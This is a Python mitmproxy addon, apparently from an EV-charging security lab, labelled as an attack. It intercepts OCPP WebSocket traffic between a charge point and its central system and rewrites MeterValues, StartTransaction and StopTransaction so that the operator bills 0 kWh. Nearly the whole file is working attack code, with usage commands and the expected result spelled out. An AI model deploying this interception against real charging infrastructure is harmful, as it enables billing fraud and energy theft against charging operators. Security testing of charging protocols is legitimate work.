"""
SALDIRI 3 - Free Charge (MeterValues manipulation).

mitmproxy WebSocket addon. EVSE'nin gonderdigi MeterValues mesajlarindaki
Energy.Active.Import.Register sayacini sifirlar. Boyleyse CSMS, ucretsiz
sarjedildigini saniyor. Ayrica StopTransaction'daki meterStop'u 0 yapar.

Kullanim:
    mitmproxy --mode reverse:http://localhost:8180 \
              -p 8400 -s attacks/free_charge.py

    python evse-sim/charge_point.py \
        --csms ws://localhost:8400/steve/websocket/CentralSystemService \
        --cp-id EVSE-001 --auto-charge --duration 60

Beklenen sonuc: EVSE 60 saniye sarj eder, gercek metre ~123 Wh okur ama
CSMS'e gidende hep 0 Wh raporlanir. SteVe fatura: 0 kWh.
"""
import json
from mitmproxy import ctx, http
from mitmproxy.websocket import WebSocketMessage


def is_call(payload) -> bool:
    return isinstance(payload, list) and len(payload) >= 3 and payload[0] == 2


def zero_meter_values(meter_value: list) -> list:
    """Tum sampled_value.value alanlarini Energy.* icin sifirla."""
    for mv in meter_value:
        for sv in mv.get("sampledValue", []):
            measurand = sv.get("measurand", "")
            if "Energy" in measurand or measurand == "":
                sv["value"] = "0"
    return meter_value


def websocket_message(flow: http.HTTPFlow):
    assert flow.websocket is not None
    msg: WebSocketMessage = flow.websocket.messages[-1]
    if not msg.is_text or not msg.from_client:
        return
    try:
        payload = json.loads(msg.text)
    except json.JSONDecodeError:
        return
    if not is_call(payload):
        return

    _, unique_id, action, data = payload
    if action == "MeterValues":
        original = json.dumps(data.get("meterValue"))[:80]
        zero_meter_values(data.get("meterValue", []))
        ctx.log.warn(f"[free] MeterValues sifirlandi (was: {original}...)")
        msg.text = json.dumps([2, unique_id, "MeterValues", data])
    elif action == "StopTransaction":
        ctx.log.warn(f"[free] StopTransaction meterStop={data.get('meterStop')} -> 0")
        data["meterStop"] = 0
        msg.text = json.dumps([2, unique_id, "StopTransaction", data])
    elif action == "StartTransaction":
        ctx.log.warn(f"[free] StartTransaction meterStart={data.get('meterStart')} -> 0")
        data["meterStart"] = 0
        msg.text = json.dumps([2, unique_id, "StartTransaction", data])
